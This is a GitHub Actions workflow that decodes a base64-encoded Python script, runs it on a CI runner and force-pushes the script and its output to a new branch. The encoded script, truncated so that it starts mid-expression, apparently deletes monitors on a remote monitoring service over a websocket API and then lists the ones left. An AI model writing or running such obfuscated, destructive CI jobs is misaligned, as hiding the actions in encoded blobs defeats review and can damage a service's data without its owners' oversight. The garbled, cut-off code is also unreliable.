name: zz714
on:
  push:
    branches: [ "zz714" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: prep
        run: pip install websocket-client==1.9.2 brotli 2>&1 | tail -2
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' > probe.b64
          echo '' >> probe.b64
          echo 'WzoyMDBdLCJyZXNwPSIsZGVjKQpmb3IgayxtaWQgaW4gaWRzLml0ZW1zKCk6CiAgICBpZiBtaWQ6IGxvZygiREVMIixrLHN0cihlbWl0KCJkZWxldGVNb25pdG9yIixtaWQsMTApKVs6ODBdKQpsb2coIk1PTkxFRlQiLHN0cihlbWl0KCJnZXRNb25pdG9yTGlzdCIsTm9uZSwxMikpWzo4MDBdKQpvcGVuKCJyNzE0Yi50eHQiLCJ3Iikud3JpdGUoIlxuIi5qb2luKE9VVCkpCg==' >> probe.b64
      - name: run
        run: |
          set +e
          python3 -c "import base64;open('probe.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          python3 probe.py > r714b.txt 2>&1
          echo exit=$?
          wc -c r714b.txt
      - name: push
        if: always()
        run: |
          set +e
          git config user.email p@e.com; git config user.name p
          git checkout -B zz714-out2
          git add -f r714b.txt probe.py
          git commit -m out2
          git push -f origin zz714-out2 2>&1 | tail -5
